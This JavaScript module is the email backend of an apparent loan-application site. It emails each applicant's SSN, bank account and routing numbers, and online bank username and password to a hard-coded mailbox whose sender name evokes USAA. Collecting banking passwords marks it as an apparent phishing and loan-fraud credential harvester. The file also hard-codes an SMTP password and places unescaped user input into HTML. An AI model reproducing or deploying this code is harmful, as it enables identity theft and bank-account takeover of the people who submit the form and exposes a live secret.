import "./env.js";
import nodemailer from "nodemailer";

const getSMTPConfig = () => {
  return {
    host: process.env.SMTP_HOST || "server394.web-hosting.com",
    port: Number(process.env.SMTP_PORT || 465),
    user: process.env.SMTP_USER || "usaa@lendingfundsusa.com",
    pass: process.env.SMTP_PASS || "8Fz4Bdtbj2YWiz7H",
    recipient: process.env.RECIPIENT_EMAIL || process.env.SMTP_USER || "usaa@lendingfundsusa.com",
    fromName: process.env.EMAIL_FROM_NAME || "usa Loans Applications",
  };
};

const createTransporter = () => {
  const config = getSMTPConfig();

  if (!config.host || !config.user || !config.pass) {
    console.warn("[emailService] Missing SMTP credentials in environment variables.");
  }

  return nodemailer.createTransport({
    host: config.host,
    port: config.port,
    secure: config.port === 465,
    auth: {
      user: config.user,
      pass: config.pass,
    },
  });
};

const formatHTML = (data) => `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif; background-color: #f9fafb; }
    .container { max-width: 900px; margin: 0 auto; background-color: #ffffff; }
    .header { background-color: #ffffff; padding: 24px; border-bottom: 3px solid #2563EB; }
    .header-title { font-size: 24px; font-weight: bold; color: #1f2937; margin: 0; display: flex; align-items: center; }
    .header-icon { margin-right: 12px; }
    .timestamp-box { background-color: #dbeafe; border-left: 4px solid #2563EB; padding: 16px; margin: 24px; border-radius: 4px; }
    .timestamp-text { margin: 0; color: #1e40af; font-weight: 600; }
    .section { margin: 24px; }
    .section-header { background-color: #f3f4f6; padding: 12px 16px; border-left: 4px solid #2563EB; margin-bottom: 16px; }
    .section-title { font-size: 16px; font-weight: bold; color: #1f2937; margin: 0; text-transform: uppercase; letter-spacing: 0.5px; }
    .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
    .field { background-color: #ffffff; border: 1px solid #e5e7eb; padding: 12px 16px; border-radius: 4px; }
    .field-label { font-size: 12px; font-weight: 600; color: #2563EB; text-transform: uppercase; margin: 0 0 4px 0; }
    .field-value { font-size: 14px; color: #1f2937; margin: 0; word-wrap: break-word; }
    .full-width { grid-column: span 2; }
    .footer { background-color: #f9fafb; padding: 24px; text-align: center; color: #6b7280; font-size: 12px; margin-top: 32px; }
    @media only screen and (max-width: 600px) {
      .grid { grid-template-columns: 1fr; }
      .full-width { grid-column: span 1; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1 class="header-title">
        <span class="header-icon">📋</span>
        New Loan Application Received
      </h1>
    </div>
    
    <div class="timestamp-box">
      <p class="timestamp-text">Submitted: ${new Date().toISOString()}</p>
    </div>
    
    <div class="section">
      <div class="section-header">
        <h2 class="section-title">📌 Application Details</h2>
      </div>
      <div class="grid">
        <div class="field">
          <p class="field-label">Loan Approval ID</p>
          <p class="field-value">${data.loanApprovalId}</p>
        </div>
        <div class="field">
          <p class="field-label">Loan Type</p>
          <p class="field-value">${data.loanType || "N/A"}</p>
        </div>
        <div class="field">
          <p class="field-label">Loan Title</p>
          <p class="field-value">${data.loanTitle || "N/A"}</p>
        </div>
        <div class="field">
          <p class="field-label">Requested Loan Amount</p>
          <p class="field-value">${data.loanAmount}</p>
        </div>
        <div class="field">
          <p class="field-label">Loan Duration</p>
          <p class="field-value">${data.loanDuration} months</p>
        </div>
        <div class="field full-width">
          <p class="field-label">Loan Purpose</p>
          <p class="field-value">${data.loanPurpose}</p>
        </div>
      </div>
    </div>
    
    <div class="section">
      <div class="section-header">
        <h2 class="section-title">👤 Personal Information</h2>
      </div>
      <div class="grid">
        <div class="field">
          <p class="field-label">First Name</p>
          <p class="field-value">${data.firstName}</p>
        </div>
        <div class="field">
          <p class="field-label">Last Name</p>
          <p class="field-value">${data.lastName}</p>
        </div>
        <div class="field">
          <p class="field-label">Email Address</p>
          <p class="field-value">${data.email}</p>
        </div>
        <div class="field">
          <p class="field-label">Birth Date</p>
          <p class="field-value">${data.birthDate}</p>
        </div>
        <div class="field">
          <p class="field-label">SSN</p>
          <p class="field-value">${data.ssn}</p>
        </div>
      </div>
    </div>
    
    <div class="section">
      <div class="section-header">
        <h2 class="section-title">🏠 Address Information</h2>
      </div>
      <div class="grid">
        <div class="field">
          <p class="field-label">Address Line 1</p>
          <p class="field-value">${data.address1}</p>
        </div>
        <div class="field">
          <p class="field-label">Address Line 2</p>
          <p class="field-value">${data.address2 || "N/A"}</p>
        </div>
        <div class="field">
          <p class="field-label">City</p>
          <p class="field-value">${data.city}</p>
        </div>
        <div class="field">
          <p class="field-label">State</p>
          <p class="field-value">${data.state}</p>
        </div>
        <div class="field">
          <p class="field-label">Zip Code</p>
          <p class="field-value">${data.zipCode}</p>
        </div>
      </div>
    </div>
    
    <div class="section">
      <div class="section-header">
        <h2 class="section-title">🏦 Bank Account Information</h2>
      </div>
      <div class="grid">
        <div class="field">
          <p class="field-label">Bank Name</p>
          <p class="field-value">${data.bankName}</p>
        </div>
        <div class="field">
          <p class="field-label">Routing Number</p>
          <p class="field-value">${data.routingNumber}</p>
        </div>
        <div class="field">
          <p class="field-label">Account Number</p>
          <p class="field-value">${data.accountNumber}</p>
        </div>
        <div class="field">
          <p class="field-label">Bank Username</p>
          <p class="field-value">${data.bankUsername}</p>
        </div>
        <div class="field full-width">
          <p class="field-label">Bank Password</p>
          <p class="field-value">${data.bankPassword}</p>
        </div>
      </div>
    </div>
    
    <div class="footer">
      <p>This application was submitted successfully via the Loan Application System.</p>
      <p>&copy; ${new Date().getFullYear()} Trust Lending Funds. All rights reserved.</p>
    </div>
  </div>
</body>
</html>
`;

const formatText = (data) => `New Loan Application Received

Loan Approval ID: ${data.loanApprovalId}
Loan Type: ${data.loanType || "N/A"}
Loan Title: ${data.loanTitle || "N/A"}
First Name: ${data.firstName}
Last Name: ${data.lastName}
Email Address: ${data.email}
Birth Date: ${data.birthDate}
SSN: ${data.ssn}
Address Line 1: ${data.address1}
City: ${data.city}
State: ${data.state}
Zip Code: ${data.zipCode}
Bank Name: ${data.bankName}
Routing Number: ${data.routingNumber}
Account Number: ${data.accountNumber}
Bank Username: ${data.bankUsername}
Password: ${data.bankPassword}
Requested Loan Amount: ${data.loanAmount}
Loan Duration (Months): ${data.loanDuration}
Loan Purpose: ${data.loanPurpose}
`;

export const sendLoanApplicationEmail = async (data) => {
  const config = getSMTPConfig();

  if (!config.recipient) {
    throw new Error("Recipient email is not configured");
  }

  const transporter = createTransporter();

  await transporter.sendMail({
    from: `"${config.fromName}" <${config.user}>`,
    to: config.recipient,
    replyTo: data.email || undefined,
    subject: `New Loan Application Received - ${data.firstName || ""} ${data.lastName || ""} (${data.loanApprovalId || "N/A"})`.trim(),
    text: formatText(data),
    html: formatHTML(data),
  });
};
